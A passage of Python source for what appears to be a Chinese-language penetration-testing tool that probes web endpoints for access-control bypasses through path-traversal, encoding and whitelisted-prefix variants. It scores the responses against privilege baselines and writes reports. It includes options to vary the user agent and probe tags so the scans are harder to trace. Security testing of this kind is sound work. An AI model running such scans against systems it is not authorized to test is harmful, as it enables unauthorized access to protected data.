        return None, r1["error"]
    r2 = await manager.send(bogus + "b", "GET", kind="low")
    if r2["error"]:
        return None, r2["error"]
    if not (similarity(r1["body"], r2["body"]) >= 0.90 and r1["code"] == r2["code"]):
        return None, f"两次错误页采样不一致({r1['code']}/{r2['code']})"
    return r1, None


# ---------------------------------------------------------------------------
# 判定引擎
# ---------------------------------------------------------------------------
def evaluate(resp, method, base_low, base_high, base_err, threshold, base_rtts=None):
    """返回 (verdict, note, confidence)。
    verdict: '★疑似绕过' / '△需复核' / '✕请求失败' / ''
    判定链：错误页对照 → WAF/CDN 过滤 → 拒绝关键字 → 高权限相似度/敏感字段实锤
    → 低基线差分。[D5 修复] 新增 5xx 状态迁移信号。"""
    if resp["error"]:
        return "✕请求失败", resp["error"], "-"

    code, base_code = resp["code"], base_low["code"]
    body_comparable = method not in NO_BODY_METHODS and resp["length"] > 0

    if base_code in OK_CODES:
        return "", "基线本就放行，跳过", "-"

    def star(note, conf):
        truncated = resp.get("truncated") or base_low.get("truncated")
        if truncated:
            note += "；响应体被截断(>512KB)，相似度判定可信度下降"
            conf = downgrade_conf(conf)
        if resp.get("rewritten"):
            note += "；⚠客户端URL被重写(变形失真)，请按实际发送URL复核"
        return "★疑似绕过", note, conf

    def check_2xx(from_redirect):
        if not body_comparable:
            return "△需复核", "状态放行但无响应体可对比", "低"
        if waf := detect_waf(resp):
            return "△需复核", f"疑似WAF拦截页({waf})", "低"
        if is_cached(resp):
            return "△需复核", "响应来自CDN缓存，可能非真实绕过", "低"
        # [修复#5] 此处恒有 code in OK_CODES（check_2xx 入口守卫），
        # 原 `code == base_err["code"]` 析取支被 OK_CODES 条件完全覆盖，
        # 属死分支已删；仅当错误页基线本身 2xx（自定义404页返200）时全量比对
        if base_err and not base_err["error"] and base_err["code"] in OK_CODES:
            sim_e = content_similarity(resp["body"], resp["ctype"],
                                       base_err["body"], base_err["ctype"],
                                       cutoff=threshold - 0.05)
            if sim_e >= threshold:
                return "", f"与错误页基线内容相似({sim_e:.2f})，视为错误页", "-"
        if DENY_HINT.search(visible_text(resp["body"])[:3000]):
            return "△需复核", "响应含拒绝/登录提示关键字", "低"
        # [D2 修复·阶段二侧] 2xx 落地为登录页：基线 401/403 而变形 200，
        # 但正文是登录表单（SPA 常见）→ 降级为待查而非误报 ★。
        # 命中 >=2 个登录页关键词且基线正文无此特征才判，防用户管理类
        # 接口含单个 password 字段被误降级。
        lp = lambda t: sum(bool(re.search(p, t, re.I)) for p in
                           ("login|signin", "password|passwd",
                            "username|用户名", "登录|登陆"))
        vis, vis_base = visible_text(resp["body"])[:3000], visible_text(base_low["body"])[:3000]
        if lp(vis) >= 2 and lp(vis_base) < 2:
            return "△需复核", "2xx 落地为登录页特征(疑似跳登录页的200落地)", "低"
        h_signals = header_signals(resp, base_low)
        rtt_sig = rtt_anomaly(resp["rtt"], base_rtts) if base_rtts else None
        if base_high and base_high["code"] in OK_CODES:
            sim = content_similarity(resp["body"], resp["ctype"],
                                     base_high["body"], base_high["ctype"],
                                     cutoff=AUTH_SIM_THRESHOLD - 0.05)
            if sim >= AUTH_SIM_THRESHOLD:
                note = f"与高权限响应内容相似度 {sim:.2f}"
                if h_signals:
                    note += f"；头信号: {'; '.join(h_signals)}"
                return star(note, "高")
            sens = sensitive_field_overlap(base_high["body"], resp["body"])
            if sens and sens[0] >= 0.5:
                note = f"命中高权限敏感字段({sens[0]:.0%}): {', '.join(sens[1][:3])}"
                if h_signals:
                    note += f"；头信号: {'; '.join(h_signals)}"
                return star(note, "高")
            if from_redirect:
                return "△需复核", f"与高权限响应内容相似度仅 {sim:.2f}", "低"
        if from_redirect:
            return "△需复核", "基线为跳转且无高权限对照，2xx 需人工确认", "低"
        sim_base = content_similarity(resp["body"], resp["ctype"],
                                      base_low["body"], base_low["ctype"],
                                      cutoff=threshold - 0.05)
        if sim_base < threshold:
            note = f"与基线内容相似度仅 {sim_base:.2f}"
            if h_signals:
                note += f"；头信号: {'; '.join(h_signals)}"
            if rtt_sig:
                note += f"；{rtt_sig}"
            return star(note, "中")
        return "", "响应与基线内容相似，视为未绕过", "-"

    if base_code in DENY_LIKE:
        if code in OK_CODES:
            return check_2xx(False)
        if code in REDIRECT_CODES:
            if is_login_redirect(resp["location"]):
                return "", "重定向到登录页，未绕过", "-"
            return "△需复核", f"重定向到 {resp['location'] or '(无Location)'}", "低"
        if code in ROUTED_CODES and code != base_code:
            return "△需复核", f"状态迁移 {base_code}→{code}，路由层解析语义已变化，建议跟进构造", "低"
        # [D5 修复] 5xx 迁移：请求疑已穿透鉴权层并触发后端异常，是跟进构造的强线索
        if code in SERVER_ERR_CODES and base_code not in SERVER_ERR_CODES:
            return "△需复核", f"状态迁移 {base_code}→{code}，请求疑已穿透鉴权层触发后端异常", "低"
        return "", "", "-"

    if base_code in REDIRECT_CODES:
        if code in OK_CODES:
            return check_2xx(True)
        if code in REDIRECT_CODES:
            loc = resp["location"]
            if loc and loc != base_low["location"] and not is_login_redirect(loc):
                return "△需复核", f"重定向目标不同: {loc}", "低"
        return "", "", "-"

    return "", f"基线状态 {base_code} 未覆盖，跳过", "-"


# ---------------------------------------------------------------------------
# 重定向链追踪与联合判定
# ---------------------------------------------------------------------------
def _parse_set_cookies(values):
    """[修复#10] 解析 Set-Cookie 值列表为 {name: value}（仅取首属性对，
    忽略 Expires 等含逗号属性对拆分的噪声）"""
    jar = {}
    for v in values or []:
        for part in v.split(","):
            kv = part.split(";", 1)[0].strip()
            if "=" in kv:
                n, val = kv.split("=", 1)
                n = n.strip()
                if n and "=" not in n and val:
                    jar[n] = val.strip()
    return jar


async def trace_redirect_chain(manager, url, method, extra_headers=None, kind="low",
                               body=None, max_hops=5):
    """手动多级重定向追踪（allow_redirects=False 逐跳请求）。
    [D8 修复] 循环检测以完整 URL（去 fragment）为键——v3.4 仅比较 path，
    同路径不同 query 的合法跳转链会被误判为循环。
    [修复#10] 链内 Cookie 传递：DummyCookieJar 全局丢弃 Set-Cookie，
    SSO ticket 类跨跳凭据会断链导致落点误判为"仍被拒"。此处维护链级
    jar（按 host 隔离、仅本链存活、不回写全局会话），每跳携带上一跳
    下发的 Cookie。
    RFC 7231：303 响应后按 GET 重发并丢弃请求体。"""
    hops = []
    current = url
    seen = {current.split("#", 1)[0]}
    chain_jar = {}
    for _ in range(max_hops):
        host = urlparse(current).netloc
        hdrs = dict(extra_headers) if extra_headers else {}
        cookies = chain_jar.get(host, {})
        if cookies:
            new = "; ".join(f"{k}={v}" for k, v in cookies.items())
            hdrs["Cookie"] = (hdrs["Cookie"] + "; " + new) if hdrs.get("Cookie") else new
        r = await manager.send(current, method, hdrs, kind=kind, body=body)
        hops.append({"url": current, "code": r["code"], "location": r.get("location", ""), "resp": r})
        if r.get("set_cookies"):
            chain_jar.setdefault(host, {}).update(_parse_set_cookies(r["set_cookies"]))
        if r["error"] or r["code"] not in REDIRECT_CODES or not r.get("location"):
            break
        nxt = urljoin(current, r["location"])
        key = nxt.split("#", 1)[0]
        if key in seen:
            hops.append({"url": nxt, "code": "LOOP", "location": "", "resp": None})
            break
        seen.add(key)
        current = nxt
        if r["code"] == 303 and method != "GET":
            method, body = "GET", None
    return hops


def analyze_redirect_row(row, chain, base_chain, base_low, base_high, threshold):
    """重定向链联合判定：最终落点与基线跳转链落点对比；
    落点 2xx 且内容与基线差异显著（或与高权限一致）→ 升级 ★。"""
    row["redirect_chain"] = [{"码": h["code"], "URL": h["url"], "Location": h.get("location", "")}
                             for h in chain]
    last = chain[-1]
    final = last.get("resp")
    row["redirect_final"] = {"状态码": last["code"], "落点": last["url"],
                             "落点路径": urlparse(last["url"]).path}
    notes = [f"{len(chain)}跳"]
    if any(h["code"] == "LOOP" for h in chain):
        notes.append("检测到跳转循环")
    init_host = urlparse(chain[0]["url"]).netloc
    ext_hosts = {urlparse(h["url"]).netloc for h in chain if h.get("url")} - {init_host}
    if ext_hosts:
        notes.append(f"⚠跳转跨域({', '.join(sorted(ext_hosts)[:2])})，已携带测试凭据")

    base_last = base_chain[-1] if base_chain else None
    base_landing = urlparse(base_last["url"]).path if base_last else ""

    verdict, conf = row["verdict"], row.get("confidence", "-")
    if final and not final.get("error"):
        if final["code"] in OK_CODES and final["length"] > 0:
            if base_high and base_high["code"] in OK_CODES:
                sim = content_similarity(final["body"], final["ctype"],
                                         base_high["body"], base_high["ctype"])
                if sim >= AUTH_SIM_THRESHOLD:
                    verdict, conf = "★疑似绕过", "高"
                    row["verify_follow"] = True
                    notes.append(f"落点2xx且与高权限内容相似度{sim:.2f}")
                else:
                    notes.append(f"落点2xx但与高权限相似度仅{sim:.2f}")
            else:
                sim_base = content_similarity(final["body"], final["ctype"],
                                              base_low["body"], base_low["ctype"])
                if sim_base < threshold:
                    verdict = "★疑似绕过"
                    conf = conf if conf in ("高", "中") else "中"
                    row["verify_follow"] = True
                    notes.append(f"落点2xx且与基线内容相似度仅{sim_base:.2f}")
                else:
                    notes.append(f"落点2xx但内容与基线相似({sim_base:.2f})，疑同页")
        else:
            landing = row["redirect_final"]["落点路径"]
            if base_landing and landing and landing != base_landing:
                notes.append(f"落点路径与基线链落点不同: {landing} vs {base_landing}")
            if final.get("code") in DENY_LIKE:
                notes.append("落点仍被拒")
    row["verdict"], row["confidence"] = verdict, conf
    row["note"] = (row["note"] + "；" if row["note"] else "") + "重定向追踪: " + "，".join(notes)
    return row


# ---------------------------------------------------------------------------
# 二次复核
# ---------------------------------------------------------------------------
async def second_verify(row, base_high, manager):
    """对 ★ 命中重测：匿名 1 次 + 低权限 2 次。
    follow/verify_follow 类命中自动追踪跳转链取最终落点判定，
    避免把"跳转后放行"的真实绕过误降级为复现失败。"""
    v = row["variant"]
    follow = bool(v.get("follow")) or bool(row.get("verify_follow"))
    ok = lambda r: r and not r["error"] and r["code"] in OK_CODES and r["length"] > 0

    async def fetch(kind):
        r = await manager.send(v["url"], v["method"], v["headers"], kind=kind, body=v.get("body"))
        if follow and not r["error"] and r["code"] in REDIRECT_CODES and r["location"]:
            chain = await trace_redirect_chain(manager, v["url"], v["method"], v["headers"],
                                               kind=kind, body=v.get("body"))
            return chain[-1]["resp"]
        return r

    anon = await fetch("anon")
    if ok(anon):
        if base_high and base_high["code"] in OK_CODES and \
                content_similarity(anon["body"], anon["ctype"],
                                   base_high["body"], base_high["ctype"]) >= AUTH_SIM_THRESHOLD:
            return "已复核：匿名即可访问且与高权限响应一致，属于未授权访问", "高"
        if content_similarity(anon["body"], anon["ctype"],
                              row["resp"]["body"], row["resp"]["ctype"]) >= AUTH_SIM_THRESHOLD:
            return "已复核：匿名即可访问，属于未授权访问", "高"

    again1 = await fetch("low")
    again2 = await fetch("low")
    if ok(again1) and ok(again2):
        s1 = content_similarity(again1["body"], again1["ctype"], row["resp"]["body"], row["resp"]["ctype"])
        s2 = content_similarity(again2["body"], again2["ctype"], row["resp"]["body"], row["resp"]["ctype"])
        if s1 >= 0.80 and s2 >= 0.80:
            # [修复#12] 置信度对称化：连续 3 次稳定复现本身是强证据，
            # 至少升"中"；结论注明原始置信度变化轨迹
            orig = row.get("confidence") or "中"
            new_conf = "高" if orig == "高" else "中"
            return (f"已复核：低权限会话连续 3 次稳定复现（置信 {orig}→{new_conf}）",
                    new_conf)
    orig = row.get("confidence") or "-"
    return (f"复测未复现（置信 {orig}→低），疑似偶发或动态内容，请人工确认", "低")


# ---------------------------------------------------------------------------
# 阶段二编排：三基线 → 变形风暴 → evaluate → 重定向联合判定 → ★二次复核
# ---------------------------------------------------------------------------
CONF_RANK = {"高": 0, "中": 1, "低": 2, "-": 3}


async def run_phase2(idx, total, target, manager, args, out_base,
                     manual_prefixes, found_prefixes):
    print("\n" + "=" * 78)
    print(f" [{idx}/{total}] 阶段二：自动越权绕过  {target}")
    print("=" * 78)

    parsed = urlparse(target)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # ---- 三基线 ----
    base_low, low_stable, _, low_rtts = await get_baseline_adaptive(
        target, manager, "low", "低权限基线")
    if base_low["error"]:
        print(f"[-] 低权限基线请求失败（{base_low['error']}），跳过该目标")
        return {"phase": 2, "target": target, "ok": False,
                "reason": base_low["error"], "rows": []}
    threshold = args.threshold - (0.03 if not low_stable else 0)
    if not low_stable:
        print(f"[!] 基线内容不稳定，判定阈值放宽至 {threshold:.2f}")

    base_high = None
    if manager.high_cookie:
        base_high, _, _, _ = await get_baseline_adaptive(
            target, manager, "high", "高权限基线")
        if base_high["error"] or base_high["code"] not in OK_CODES:
            print(f"[!] 高权限基线 HTTP {base_high['code']}，仅作弱对照")

    base_err, err_reason = await get_error_baseline(origin, manager)
    if base_err is None:
        print(f"[!] 错误页基线不可用（{err_reason}），伪 2xx 过滤降级")

    base_chain = None
    if base_low["code"] in REDIRECT_CODES and base_low.get("location"):
        base_chain = await trace_redirect_chain(manager, target, "GET", kind="low")
        print("    基线跳转链: " + " → ".join(str(h["code"]) for h in base_chain))

    if base_low["code"] in OK_CODES:
        print(f"[-] 低权限基线即 HTTP {base_low['code']}，目标本就放行，无越权可测")
        return {"phase": 2, "target": target, "ok": True,
                "baseline_open": True, "rows": []}

    # ---- 变形生成：[D4/D2修复] 实测前缀折叠 + 手工前缀保留，合并去重 ----
    hi_prefixes = merge_prefixes(manual_prefixes, found_prefixes)
    if hi_prefixes:
        shown = ", ".join("/" + p for p in hi_prefixes[:12])
        print(f"[*] 借道前缀（已折叠 {len(hi_prefixes)} 个）: {shown}"
              + (" …" if len(hi_prefixes) > 12 else ""))

    variants = generate_variants(target, categories=args.categories,
                                 hi_prefixes=hi_prefixes,
                                 probe_method=args.probe_method,
                                 combine=args.combine,
                                 combine_cap=args.combine_cap,
                                 prefix_cap=args.prefix_cap)
    variants = round_robin_slice(variants, args.variant_cap)
    by_cat = defaultdict(int)
    for v in variants:
        by_cat[v["cat"]] += 1
    print(f"[*] 变形 {len(variants)} 个: " + "，".join(f"{c}×{n}" for c, n in by_cat.items()))

    # ---- 风暴 + 判定（[D10] 周期性基线健康检查与熔断）----
    rows, broken = [], ""
    reporter = ProgressReporter(prefix="    ")
    rtts_seen = []
    n_star = n_chk = 0
    t0 = time.monotonic()
    for i, v in enumerate(variants, 1):
        if args.health_interval and i % args.health_interval == 0:
            h = await manager.send(target, "GET", kind="low")
            drift = (bool(h["error"]) or h["code"] != base_low["code"] or
                     (h["length"] > 0 and base_low["length"] > 0 and
                      content_similarity(h["body"], h["ctype"],
                                         base_low["body"], base_low["ctype"]) < 0.80))
            if drift:
                broken = (f"第 {i} 个变形处基线漂移"
                          f"（{base_low['code']}→{h['code'] or h['error']}），"
                          f"疑似低权限会话过期")
                print(f"\n[!] {broken}，熔断剩余 {len(variants) - i + 1} 个变形")
                break
        resp = await manager.send(v["url"], v["method"], v["headers"],
                                  kind="low", body=v.get("body"))
        rtts_seen.append(resp["rtt"])
        verdict, note, conf = evaluate(resp, v["method"], base_low, base_high,
                                       base_err, threshold, base_rtts=low_rtts)
        row = {"target": target, "cat": v["cat"], "desc": v["desc"],
               "method": v["method"], "raw": v["raw"], "url": v["url"],
               "code": resp["code"], "length": resp["length"], "rtt": resp["rtt"],
               "verdict": verdict, "confidence": conf, "note": note,
               "复核": "", "redirect_chain": [], "redirect_final": "",
               "resp": resp, "variant": v}
        rows.append(row)
        if verdict == "★疑似绕过":
            n_star += 1
        elif verdict == "△需复核":
            n_chk += 1
        if resp["code"] in REDIRECT_CODES and resp.get("location") \
                and not is_login_redirect(resp["location"]):
            chain = await trace_redirect_chain(manager, v["url"], v["method"],
                                               v["headers"], kind="low",
                                               body=v.get("body"))
            prev = row["verdict"]
            analyze_redirect_row(row, chain, base_chain, base_low,
                                 base_high, threshold)
            if prev != row["verdict"]:
                if prev == "★疑似绕过":
                    n_star -= 1
                elif prev == "△需复核":
                    n_chk -= 1
                if row["verdict"] == "★疑似绕过":
                    n_star += 1
                elif row["verdict"] == "△需复核":
                    n_chk += 1
        reporter.update(i, len(variants), n_star, n_chk, rtts_seen)
    reporter.finish(f"完成 {len(rows)}/{len(variants)} 变形，耗时 "
                    f"{time.monotonic() - t0:.0f}s")

    # ---- ★ 命中二次复核（匿名 1 次 + 低权限 2 次，跳转类取最终落点）----
    stars = sorted((r for r in rows if r["verdict"] == "★疑似绕过"),
                   key=lambda r: CONF_RANK.get(r["confidence"], 9))
    for r in stars[:args.verify_cap]:
        msg, conf = await second_verify(r, base_high, manager)
        r["复核"] = msg
        if conf in ("高", "中", "低"):
            r["confidence"] = conf

    hits = [r for r in rows if r["verdict"] in ("★疑似绕过", "△需复核")]
    hits.sort(key=lambda r: (r["verdict"] != "★疑似绕过",
                             CONF_RANK.get(r["confidence"], 9)))
    print(f"\n[结果] 变形 {len(rows)} 个，★疑似绕过 {len(stars)}，△需复核 {len(hits) - len(stars)}"
          + (f"；已熔断：{broken}" if broken else ""))
    if hits:
        print(f"  {pad('判定/置信', 12)}{pad('类别', 10)}{pad('变形', 44)}状态")
        print("  " + "-" * 74)
        for r in hits[:40]:
            tag = f"{r['verdict'][0]}{r['confidence']}"
            print(f"  {pad(tag, 12)}{pad(r['cat'], 10)}{pad(r['desc'][:40], 44)}{r['code']}")
        if len(hits) > 40:
            print(f"  … 另有 {len(hits) - 40} 条详见 CSV")
        for r in hits[:10]:
            if r["note"]:
                print(f"    ⚠ {r['desc']}: {r['note'][:110]}")
            if r["复核"]:
                print(f"    ✔ {r['复核']}")
    else:
        print("  未见疑似绕过信号")

    # ---- 报告落盘：CSV（全量）+ JSON（命中详情）+ 证据 ----
    pf = f"{out_base}_{idx:02d}_bypass"
    cols = ["cat", "desc", "method", "raw", "url", "code", "length", "rtt",
            "verdict", "confidence", "note", "redirect_final", "复核"]
    flat = []
    for r in rows:
        d = {c: r.get(c, "") for c in cols}
        # [修复#13] redirect_final 统一序列化为字符串：dict 形态会被
        # csv 写成 Python 字面量，破坏下游解析。格式 "状态码 落点路径"。
        rf = r.get("redirect_final")
        if isinstance(rf, dict):
            d["redirect_final"] = f"{rf.get('状态码', '')} {rf.get('落点路径', '')}".strip()
        elif not rf and r.get("redirect_chain"):
            d["redirect_final"] = "→".join(str(h["码"]) for h in r["redirect_chain"])
        flat.append(d)
    with open(pf + ".csv", "w", encoding="utf-8-sig", newline="") as f:
        w = csv.DictWriter(f, fieldnames=cols)
        w.writeheader()
        w.writerows(flat)

    def base_brief(b):
        if not b or b.get("error"):
            return None
        return {"code": b["code"], "length": b["length"], "location": b.get("location", ""),
                "fingerprint": fingerprint(b["body"]) if b.get("body") else ""}

    jrows = []
    for r in hits:
        jrows.append({
            "target": r["target"], "cat": r["cat"], "desc": r["desc"],
            "method": r["method"], "url": r["url"], "code": r["code"],
            "length": r["length"], "rtt": r["rtt"], "verdict": r["verdict"],
            "confidence": r["confidence"], "note": r["note"], "复核": r["复核"],
            "redirect_chain": r.get("redirect_chain") or [],
            "fingerprint": fingerprint(r["resp"]["body"]) if r["resp"].get("body") else "",
            "body_head": redact_text((r["resp"].get("body") or "")[:600]),
        })
    with open(pf + "_hits.json", "w", encoding="utf-8") as f:
        json.dump({"target": target, "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                   "threshold": threshold, "baseline_low": base_brief(base_low),
                   "baseline_high": base_brief(base_high),
                   "baseline_error": base_brief(base_err),
                   "hi_prefixes": hi_prefixes, "circuit": broken,
                   "variants_total": len(variants), "sent": len(rows),
                   "hits": jrows}, f, ensure_ascii=False, indent=2)

    if args.evidence and hits:
        ev_dir = pf + "_evidence"
        os.makedirs(ev_dir, exist_ok=True)
        for n, r in enumerate(hits[:20], 1):
            ctype = r["resp"].get("ctype") or ""
            ext = "json" if "json" in ctype.lower() else \
                ("txt" if "html" not in ctype.lower() else "html")
            safe = re.sub(r"[^\w.-]", "_", r["desc"])[:40] or "hit"
            path = os.path.join(ev_dir, f"{n:02d}_{r['code']}_{safe}.{ext}")
            with open(path, "w", encoding="utf-8") as f:
                f.write(redact_text(r["resp"].get("body") or ""))
        print(f"[*] 命中证据已留存: {ev_dir}")

    print(f"[*] 报告: {pf}.csv / {pf}_hits.json")
    return {"phase": 2, "target": target, "ok": True, "rows": rows,
            "stars": len(stars), "needs": len(hits) - len(stars),
            "circuit": broken, "report": pf}


# ---------------------------------------------------------------------------
# [v4.2] 交互模式：无 --url/--url-file 启动时逐个收集目标
# ---------------------------------------------------------------------------
def is_valid_target(raw):
    """校验目标URL：缺省协议补 http://；要求 http(s) + 有效主机名。
    返回规范化 URL 或 None。"""
    t = (raw or "").strip()
    if not t or " " in t:
        return None
    if not t.startswith(("http://", "https://")):
        t = "http://" + t
    try:
        p = urlparse(t)
    except ValueError:
        return None
    if p.scheme not in ("http", "https") or not p.netloc:
        return None
    host = (p.hostname or "").lower()
    if not (host == "localhost" or host.startswith("127.") or "." in host):
        return None
    return t


def prompt_targets():
    """交互式目标收集：一次一个URL，非法输入排除；
    每个URL后由用户决定继续输入还是开始探测。
    返回目标列表；用户放弃/无有效目标时返回 None。"""
    print("\n" + "=" * 78)
    print(" 交互模式：未指定 --url / --url-file，逐个输入目标URL")
    print(" · 每行一个 URL，缺省协议自动补 http://（支持 IP / 域名 / localhost）")
    print(" · 非法输入将被排除；重复目标自动去重")
    print(" · 直接回车 = 结束输入并开始探测；输入 q = 放弃退出")
    print(" · 其余参数仍可用（如 --cookie/--proxy/--combine），例如：")
    print("   python whitelist_bypass_v4.py --cookie \"sid=xxx\"")
    print("=" * 78)
    targets = []
    while True:
        try:
            raw = input(f"\n [目标 {len(targets) + 1}] 输入URL（回车开始探测）: ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return targets if targets else None
        if not raw:
            if targets:
                return targets
            print(" [-] 尚未输入任何有效目标，请先输入一个URL")
            continue
        if raw.lower() in ("q", "quit", "exit"):
            return None
        t = is_valid_target(raw)
        if not t:
            print(f" [-] 非法目标URL，已排除: {raw[:60]}")
            continue
        if t in targets:
            print(" [-] 重复目标，已忽略")
        else:
            targets.append(t)
            print(f" [+] 已加入 {t}（当前共 {len(targets)} 个）")
        try:
            act = input("     回车=继续输入下一个，输入 go=立即开始探测: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return targets
        if act in ("go", "g", "start", "s"):
            return targets


def build_argparser():
    ap = argparse.ArgumentParser(
        prog="whitelist_bypass_v4.py",
        description="免鉴权白名单借道 × 编码穿越 × 路径拼接 一体化越权探测 v4.2（仅限已授权测试）；"
                    "不带 --url/--url-file 启动时进入交互模式",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python whitelist_bypass_v4.py                                # 交互模式逐个输入目标\n"
            "  python whitelist_bypass_v4.py --url http://t1/app/admin/user/list\n"
            "  python whitelist_bypass_v4.py --url-file targets.txt --cookie \"sid=xxx\" --high-cookie \"sid=admin\"\n"
            "  python whitelist_bypass_v4.py --url http://t/... --probe-only\n"
            "  python whitelist_bypass_v4.py --url http://t/... --no-discover --whitelist-prefix static\n"
            "  python whitelist_bypass_v4.py --url http://t/... --combine --probe-method --evidence\n"
            "类别代号: D借道前缀 C目录穿越 B..;/穿越 R编码解码 S路径拼接 A分号参数\n"
            "          U解码跳跃 H头部注入 N内容协商 I方法 X组合"))
    tgt = ap.add_argument_group("目标")
    tgt.add_argument("--url", action="append", default=[], help="目标URL，可多次")
    tgt.add_argument("--url-file", help="目标清单文件，每行一个URL")
    ident = ap.add_argument_group("身份")
    ident.add_argument("--cookie", default="", help="低权限会话Cookie（缺省=匿名测试未授权访问）")
    ident.add_argument("--high-cookie", dest="high_cookie", default="",
                       help="高权限会话Cookie（可选，提供后可实锤数据一致性）")
    ident.add_argument("--header", action="append", default=[],
                       help="附加请求头 'K: V'，可多次")
    ident.add_argument("--ua", default=DEFAULT_UA,
                       help="自定义 User-Agent（降低固定指纹被溯源/聚类的风险）")
    ident.add_argument("--probe-tag", dest="probe_tag", default="authz_probe_",
                       help="阶段一垃圾路径前缀标记（默认 authz_probe_，可自定义避指纹）")
    net = ap.add_argument_group("网络")
    net.add_argument("--proxy", default="", help="代理 http://x:8080")
    net.add_argument("--timeout", type=float, default=15.0)
    net.add_argument("--delay", type=float, default=0.1, help="请求间隔基数(秒)")
    net.add_argument("--jitter", type=float, default=0.3, help="间隔抖动系数")
    net.add_argument("--concurrency", type=int, default=8)
    ph = ap.add_argument_group("阶段控制")
    ph.add_argument("--probe-only", dest="probe_only", action="store_true",
                    help="仅执行阶段一（白名单前缀探测）")
    ph.add_argument("--no-discover", dest="no_discover", action="store_true",
                    help="跳过阶段一，仅阶段二（配合 --whitelist-prefix）")
    ph.add_argument("--whitelist-prefix", dest="whitelist_prefix", action="append", default=[],
                    help="手工指定免鉴权前缀，可多次；与实测前缀合并、父覆盖子折叠")
    ph.add_argument("--extra-candidate", dest="extra_candidate", action="append", default=[],
                    help="阶段一追加候选，逗号分隔，可多次")
    st = ap.add_argument_group("变形引擎")
    st.add_argument("--categories", help="限定类别，逗号分隔（D/C/B/R/S/A/I/X 或中文全称）")
    st.add_argument("--probe-method", dest="probe_method", action="store_true",
                    help="开启 HTTP 方法覆盖族（默认关闭）")
    st.add_argument("--combine", action="store_true", help="开启双因子组合变形")
    st.add_argument("--variant-cap", dest="variant_cap", type=int, default=400,
                    help="变形总量上限（按类别轮转截取）")
    st.add_argument("--prefix-cap", dest="prefix_cap", type=int, default=150,
                    help="借道前缀×形态总配额（内置前缀受此约束，实测/手工不受限）")
    st.add_argument("--combine-cap", dest="combine_cap", type=int, default=200)
    jd = ap.add_argument_group("判定与输出")
    jd.add_argument("--threshold", type=float, default=0.90, help="内容相似度判定阈值")
    jd.add_argument("--verify-cap", dest="verify_cap", type=int, default=10,
                    help="★命中二次复核上限")
    jd.add_argument("--health-interval", dest="health_interval", type=int, default=30,
                    help="每N个变形复查基线防会话过期，0=关闭")
    jd.add_argument("--evidence", action="store_true", help="留存命中响应体（脱敏）")
    jd.add_argument("--out-dir", dest="out_dir", default="wb_v4_out")
    return ap


async def async_main(args):
    targets = list(args.url)
    if args.url_file:
        with open(args.url_file, encoding="utf-8-sig") as f:
            targets += [ln.strip() for ln in f
                        if ln.strip() and not ln.lstrip().startswith("#")]
    targets = [t if t.startswith(("http://", "https://")) else "http://" + t
               for t in targets]
    seen = set()
    targets = [t for t in targets if not (t in seen or seen.add(t))]
    if not targets:
        print("[-] 未指定目标：使用 --url 或 --url-file")
        return 2

    extra_headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()

    manager = RequestManager({
        "low_cookie": args.cookie, "high_cookie": args.high_cookie,
        "extra_headers": extra_headers, "proxy": args.proxy,
        "timeout": args.timeout, "delay": args.delay,
        "jitter": args.jitter, "concurrency": args.concurrency,
        "ua": args.ua,
    })

    os.makedirs(args.out_dir, exist_ok=True)
    stamp = time.strftime("%Y%m%d_%H%M%S")
    out_base = os.path.join(args.out_dir, f"wb4_{stamp}")
    total = len(targets)

    print("=" * 78)
    print(f" whitelist_bypass v{VERSION} | 目标 {total} 个 | 并发 {args.concurrency}"
          f" 间隔 {args.delay}s±{args.jitter} | 超时 {args.timeout}s")
    print(f" 身份: 低权限={mask_cookie(args.cookie) or '(匿名)'}"
          + (f" 高权限={mask_cookie(args.high_cookie)}" if args.high_cookie else ""))
    print(" 仅限已授权安全测试使用；Cookie 与证据均脱敏留存。")
    print("=" * 78)

    summary = []
    try:
        for i, tgt in enumerate(targets, 1):
            found_prefixes = []
            if not args.no_discover:
                p1 = await probe_target(i, total, tgt, manager, args, out_base)
                if not p1["ok"]:
                    summary.append({"phase": 1, **p1})
                    if not args.probe_only:
                        # [修复#1] 失败传播警告：阶段一失败则实测借道前缀
                        # 缺失，明确提示补救手段而非静默继续
                        print(f"[!] 阶段一失败，阶段二将缺少实测借道前缀"
                              f"（可用 --whitelist-prefix 手工指定，"
                              f"或修复网络后重跑 --probe-only 补测）")
                        r2 = await run_phase2(i, total, tgt, manager, args,
                                              out_base, args.whitelist_prefix, [])
                        summary.append(r2)
                    continue
                found_prefixes = [r["前缀"] for r in p1["found"]
                                  if r["置信度"] in ("高", "中")]
                if args.probe_only:
                    summary.append({"phase": 1, **p1})
                    continue
            r2 = await run_phase2(i, total, tgt, manager, args, out_base,
                                  args.whitelist_prefix, found_prefixes)
            summary.append(r2)
    except KeyboardInterrupt:
        print("\n[!] 用户中断，汇总已完成部分")
    finally:
        await manager.close()

    print("\n" + "=" * 78)
    print(f" 汇总（完成 {len(summary)} 项 / 目标 {total} 个）")
    for s in summary:
        if s.get("phase") == 1:
            if s.get("ok"):
                print(f"  ○ [阶段一] {s['target']}: 白名单前缀 {len(s.get('found', []))} 个"
                      + (f" → {s['report']}.csv" if s.get("report") else ""))
            else:
                print(f"  ✕ [阶段一] {s['target']}: {s.get('reason', '失败')}")
        else:
            if not s.get("ok"):
                print(f"  ✕ [阶段二] {s['target']}: {s.get('reason', '失败')}")
            elif s.get("baseline_open"):
                print(f"  · [阶段二] {s['target']}: 基线本就放行，无越权可测")
            else:
                mark = "★" if s.get("stars") else "·"
                extra = f"；熔断: {s['circuit']}" if s.get("circuit") else ""
                print(f"  {mark} [阶段二] {s['target']}: ★{s.get('stars', 0)}"
                      f" △{s.get('needs', 0)} / 变形 {len(s.get('rows', []))}{extra}"
                      + (f" → {s['report']}.csv" if s.get("report") else ""))
    print(f" 输出目录: {os.path.abspath(args.out_dir)}")
    print("=" * 78)
    return 0


def main():
    # Windows cp936 控制台打印 ★✔⚠ 等符号会 UnicodeEncodeError，强制 UTF-8
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except Exception:
            pass
    args = build_argparser().parse_args()
    if not args.url and not args.url_file:
